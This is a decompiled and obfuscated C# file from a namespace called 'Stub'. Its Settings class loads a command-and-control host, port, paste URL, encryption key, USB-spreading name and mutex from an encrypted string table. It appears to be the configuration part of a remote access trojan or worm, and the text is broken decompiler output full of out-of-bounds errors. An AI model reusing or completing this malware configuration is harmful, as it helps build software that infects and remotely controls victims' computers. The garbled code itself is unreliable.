using System.Diagnostics;
using System.Threading;

namespace Stub;

public class Settings
{
	public static string PasteUrl;

	public static string Host;

	public static string Port;

	public static string KEY;

	public static string SPL;

	public static string USBNM;

	public static readonly string Mutexx;

	public static Mutex _appMutex;

	public static USB USBS;

	public static string current;

	static Settings()
	{
		//IL_015f: Expected I4, but got Unknown
		Class0.smethod_13();
		_ = 10;
		/*Error near IL_000a: stloc 0 (out-of-bounds)*/;
		while (true)
		{
			switch ((int)/*Error near IL_0126: ldloc 0 (out-of-bounds)*/)
			{
			case 10:
				PasteUrl = Class0.smethod_11(1208);
				_ = 1;
				/*Error near IL_0027: stloc 0 (out-of-bounds)*/;
				break;
			case 9:
				SPL = Class0.smethod_11(1224);
				goto default;
			default:
				USBNM = Class0.smethod_11(1228);
				_ = 2;
				/*Error near IL_0053: stloc 0 (out-of-bounds)*/;
				if (smethod_0())
				{
					break;
				}
				goto case 9;
			case 8:
				do
				{
					Port = Class0.smethod_11(1216);
					smethod_1();
					if (!smethod_0())
					{
						_ = 6;
						/*Error near IL_0084: stloc 0 (out-of-bounds)*/;
						continue;
					}
					_ = 0;
					/*Error near IL_009a: stloc 0 (out-of-bounds)*/;
					break;
				}
				while (smethod_1());
				break;
			case 2:
				Mutexx = Class0.smethod_11(1232);
				goto case 6;
			case 6:
			case 7:
				USBS = new USB();
				_ = 5;
				/*Error near IL_00c1: stloc 0 (out-of-bounds)*/;
				if (!smethod_1())
				{
					break;
				}
				goto case 2;
			case 5:
				current = Process.GetCurrentProcess().MainModule!.FileName;
				_ = 11;
				/*Error near IL_00e7: stloc 0 (out-of-bounds)*/;
				break;
			case 0:
			case 3:
				KEY = Class0.smethod_11(1220);
				_ = 9;
				/*Error near IL_0101: stloc 0 (out-of-bounds)*/;
				break;
			case 1:
				Host = Class0.smethod_11(1212);
				_ = 8;
				/*Error near IL_011b: stloc 0 (out-of-bounds)*/;
				if (!smethod_1())
				{
					break;
				}
				goto case 6;
			case 11:
				return;
			}
		}
	}

	internal static bool smethod_0()
	{
		return true;
	}

	internal static bool smethod_1()
	{
		return true;
	}
}
